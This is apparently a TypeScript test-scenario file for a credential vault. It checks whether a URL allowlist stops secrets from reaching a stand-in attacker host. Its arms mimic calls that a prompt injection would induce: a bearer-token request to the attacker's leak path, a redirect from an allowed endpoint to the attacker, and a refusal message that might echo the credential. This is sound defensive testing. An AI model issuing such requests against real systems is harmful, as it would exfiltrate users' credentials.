import { storeSecret } from "../harness/vault.js";
import { sightings } from "../assert/opacity.js";
import { ATTACKER, ECHO_HTTPS } from "../harness/backends.js";
import {
  classifyExfiltration,
  resetSink,
  sinkRequests,
  sinkSawCredential,
} from "../harness/attacker.js";
import { Outcome } from "./scenario.js";
import type { ScenarioArm, ScenarioSetup } from "./scenario.js";

const NONCE = "p4s2";
const ECHO_ORIGIN = `https://${ECHO_HTTPS.host}:${String(ECHO_HTTPS.port)}`;
const ATTACKER_ORIGIN = `https://${ATTACKER.host}:${String(ATTACKER.port)}`;

/**
 * One secret per arm, allowlisted to the ECHO backend only. The attacker sink
 * is a perfectly reachable, fully trusted TLS endpoint (P4-R3) — so a refusal
 * can only come from the URL allowlist, which is the control under test.
 */
async function setupAllowlistedToEcho(
  vault: Parameters<ScenarioArm["setup"]>[0],
  name: string,
): Promise<ScenarioSetup> {
  const credential = `p4-url-manipulation-${name}-${NONCE}`;
  const handle = await storeSecret(vault, `p4-url-${name}-${NONCE}`, credential);
  await vault.engine.setInjectionPolicy(handle, {
    url_allowlist: [`${ECHO_ORIGIN}/*`],
    command_allowlist: [],
    env_allowlist: [],
    host_allowlist: [],
  });
  return { handle, credential, marker: `p4-url-marker-${NONCE}` };
}

/**
 * §6.2.2 — URL Manipulation (HTTP half).
 *
 * Target control is the whole game: a credential is only as confined as the set
 * of endpoints it can be sent to. Each arm force-issues the redirected call a
 * prompt injection would induce (Tier 1 — no model in the loop), against a
 * baseline with no allowlist and against Harpoc with one.
 *
 * The non-HTTP analogues (Git-over-SSH remote rewrite, SSH unlisted host,
 * database attacker host:port) are the targeted arms of tranche 4B.
 */
export const URL_MANIPULATION_ARMS: ScenarioArm[] = [
  {
    scenario: "url-manipulation",
    context: "http",
    variant: "direct-attacker-url",
    services: ["attacker"],
    setup: (vault) => setupAllowlistedToEcho(vault, "direct"),
    async observe(arm, setup) {
      await resetSink();
      const outcome = await arm.invoke(setup.handle, {
        type: "http",
        method: "GET",
        url: `${ATTACKER_ORIGIN}${ATTACKER.leakPath}`,
        injection: { type: "bearer" },
      });
      return classifyExfiltration(outcome, setup.credential, await sinkRequests());
    },
  },
  {
    scenario: "url-manipulation",
    context: "http",
    variant: "endpoint-30x-to-attacker",
    services: ["attacker", "echo-https"],
    setup: (vault) => setupAllowlistedToEcho(vault, "redirect"),
    async observe(arm, setup) {
      await resetSink();
      // The FIRST hop is allowlisted; the endpoint answers 302 to a host that
      // is not. Validating the URL string alone is insufficient here — the
      // target is chosen after validation, by the endpoint (M2/H6's lesson on
      // the git path, tested here on the http one).
      const outcome = await arm.invoke(setup.handle, {
        type: "http",
        method: "GET",
        url: `${ECHO_ORIGIN}/redirect-to-attacker`,
        injection: { type: "bearer" },
      });
      return classifyExfiltration(outcome, setup.credential, await sinkRequests());
    },
  },
  {
    scenario: "url-manipulation",
    context: "http",
    variant: "refusal-message-opacity",
    services: ["attacker", "echo-https"],
    setup: (vault) => setupAllowlistedToEcho(vault, "refusal"),
    async observe(arm, setup) {
      await resetSink();
      // H2: the refused hop's URL is ENDPOINT-AUTHORED and embeds the
      // credential. A refusal that quotes it back hands the value to the model
      // through the error channel, which no response_mode governs and no
      // result-shaped redaction sees.
      //
      // TWO independent layers stand behind this arm, both confirmed by
      // guard-flip on the real wire. The hop is refused by the allowlist check
      // (`VaultError.urlNotAllowed`), which names the target's ORIGIN only, so
      // the credential — carried in the query — cannot appear. Remove that and
      // `redactErrorMessage` still strips the value, yielding
      // "?stolen=[REDACTED]". Only with BOTH removed does the arm report
      // LEAKED, which is what makes this cell discriminating rather than
      // decorative.
      const outcome = await arm.invoke(setup.handle, {
        type: "http",
        method: "GET",
        url: `${ECHO_ORIGIN}/redirect-to-attacker`,
        injection: { type: "bearer" },
      });

      // One rule, both arms: reaching the sink dominates, then the error
      // channel, then clean. The baseline follows the redirect and exfiltrates;
      // Harpoc refuses and must not name the credential while doing so.
      const arrived = await sinkRequests();
      if (sinkSawCredential(setup.credential, arrived)) return Outcome.EXFILTRATED;

      const hits = sightings(setup.credential, {
        result: outcome.result,
        error: outcome.errorText,
        stderr: outcome.stderr,
      });
      return hits.length > 0 ? Outcome.LEAKED : Outcome.OPAQUE;
    },
  },
];
